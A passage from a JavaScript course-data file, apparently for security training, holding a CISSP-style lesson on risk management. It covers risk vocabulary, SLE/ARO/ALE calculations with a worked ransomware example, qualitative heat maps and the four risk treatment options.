    ["Business Associate Agreement", "HIPAA contract binding vendors that handle PHI"],
    ["Data controller", "GDPR entity deciding the purposes and means of processing"],
    ["Form 8-K Item 1.05", "SEC disclosure of a material cyber incident within four business days of materiality determination"]
  ],
  standards: ["PCI DSS v4.0.1", "HIPAA Security Rule (45 CFR Part 164)", "GDPR (Regulation (EU) 2016/679)", "SEC Release 33-11216", "NIS2 Directive"]
},
{
  id: "p4-m3-l4",
  module: "p4-m3",
  title: "Risk Management and Quantitative Risk Calculations",
  minutes: 18,
  objectives: [
    "Define asset, threat, vulnerability, likelihood, impact and risk",
    "Calculate SLE, ARO and ALE and justify a control by cost",
    "Compare qualitative and quantitative analysis",
    "Choose among the four risk treatment options"
  ],
  html: `
<p>Risk management is how security leaders decide where money and effort go. You will see it in every CISSP domain and in real budget meetings. The math is simple; the judgment is the hard part.</p>

<h3>Core vocabulary</h3>
<ul>
<li><strong>Asset</strong>: anything of value (data, systems, people, reputation).</li>
<li><strong>Threat</strong>: a potential cause of harm (ransomware gang, flood, careless insider).</li>
<li><strong>Vulnerability</strong>: a weakness a threat can exploit (unpatched VPN, no backups).</li>
<li><strong>Risk</strong>: the likelihood that a threat exploits a vulnerability, combined with the impact. Often written as Risk = Likelihood x Impact.</li>
<li><strong>Inherent risk</strong>: before controls. <strong>Residual risk</strong>: after controls. Total risk minus controls gap equals residual.</li>
<li><strong>Risk appetite</strong> (broad willingness) and <strong>risk tolerance</strong> (acceptable variation around a specific objective).</li>
</ul>

<h3>Quantitative analysis</h3>
<table>
<thead><tr><th>Term</th><th>Formula</th><th>Meaning</th></tr></thead>
<tbody>
<tr><td>AV, Asset Value</td><td>-</td><td>Monetary value of the asset</td></tr>
<tr><td>EF, Exposure Factor</td><td>Percentage, 0 to 100%</td><td>Portion of asset value lost in one occurrence</td></tr>
<tr><td>SLE, Single Loss Expectancy</td><td>SLE = AV x EF</td><td>Cost of one occurrence</td></tr>
<tr><td>ARO, Annualized Rate of Occurrence</td><td>Events per year</td><td>Once every 4 years = 0.25</td></tr>
<tr><td>ALE, Annualized Loss Expectancy</td><td>ALE = SLE x ARO</td><td>Expected yearly loss</td></tr>
</tbody>
</table>

<h4>Worked example</h4>
<p>A customer database is valued at $2,000,000. A ransomware event would destroy or expose about 40% of its value (EF = 0.4). Threat intelligence suggests one such event every five years (ARO = 0.2).</p>
<pre><code>SLE = 2,000,000 x 0.4 = $800,000
ALE = 800,000 x 0.2  = $160,000 per year</code></pre>
<p>A proposed immutable backup and EDR upgrade costs $60,000 per year and would reduce ARO to 0.05.</p>
<pre><code>New ALE          = 800,000 x 0.05 = $40,000
Value of control = ALE before - ALE after - annual cost of control
                 = 160,000 - 40,000 - 60,000 = $60,000 per year</code></pre>
<p>A positive value means the control is cost-justified. A control should generally not cost more than the asset or the loss it prevents.</p>

<div class="callout warn">Quantitative numbers look precise but rest on estimates. Be transparent about assumptions. Methods such as FAIR (Factor Analysis of Information Risk) use ranges and Monte Carlo simulation instead of single-point guesses, which gives leadership a more honest picture.</div>

<h3>Qualitative analysis</h3>
<p>Most organizations use a qualitative <strong>heat map</strong>: likelihood and impact each rated 1 to 5 (or Low/Medium/High), multiplied or plotted on a matrix. It is fast and easy to communicate, but subjective. Techniques include interviews, workshops and the <strong>Delphi technique</strong> (anonymous rounds of expert opinion to avoid groupthink). In practice, hybrid approaches are common.</p>
<table>
<thead><tr><th>Likelihood \ Impact</th><th>Low</th><th>Medium</th><th>High</th></tr></thead>
<tbody>
<tr><td>High</td><td>Medium</td><td>High</td><td>Critical</td></tr>
<tr><td>Medium</td><td>Low</td><td>Medium</td><td>High</td></tr>
<tr><td>Low</td><td>Low</td><td>Low</td><td>Medium</td></tr>
</tbody>
</table>

<h3>Risk treatment</h3>
<table>
<thead><tr><th>Option</th><th>Description</th><th>Example</th></tr></thead>
<tbody>
<tr><td>Mitigate (reduce)</td><td>Apply controls</td><td>Deploy MFA, patch, segment</td></tr>
<tr><td>Transfer (share)</td><td>Shift financial impact to a third party</td><td>Cyber insurance, outsourcing with contractual liability</td></tr>
<tr><td>Avoid</td><td>Stop the risky activity</td><td>Decommission an internet-facing legacy app</td></tr>
<tr><td>Accept</td><td>Formally acknowledge and live with it</td><td>Signed risk acceptance by the risk owner, reviewed annually</td></tr>
</tbody>
</table>
<p>Ignoring or rejecting a risk is <em>not</em> a valid treatment. Risks are tracked in a <strong>risk register</strong> with an owner, rating, treatment and due date. Frameworks include NIST SP 800-30 (risk assessments), SP 800-39 (enterprise risk), ISO/IEC 27005 and ISO 31000.</p>

<div class="callout real"><strong>On the job:</strong> Analysts feed risk management daily. When you find a recurring issue, such as "service accounts with passwords that never expire," write it up with likelihood, impact and a proposed fix. That turns a ticket into a risk register entry and gets it funded.</div>

<div class="callout exam"><strong>CISSP Domain 1:</strong> Memorize SLE = AV x EF and ALE = SLE x ARO, and the control value formula. Only senior management or the designated risk owner can accept risk; transferring risk does not transfer accountability.</div>
`,
  keyTerms: [
    ["SLE", "Single Loss Expectancy = Asset Value x Exposure Factor"],
    ["ARO", "Annualized Rate of Occurrence: expected frequency per year"],
    ["ALE", "Annualized Loss Expectancy = SLE x ARO"],
    ["Residual risk", "Risk remaining after controls are applied"],
    ["Risk register", "Record of identified risks, owners, ratings and treatments"],
    ["Risk transference", "Shifting financial impact to another party, e.g. insurance"]
  ],
  standards: ["NIST SP 800-30 Rev 1", "NIST SP 800-39", "ISO/IEC 27005:2022", "ISO 31000:2018", "FAIR"],
  labs: ["lab-risk-calc"]
}
);
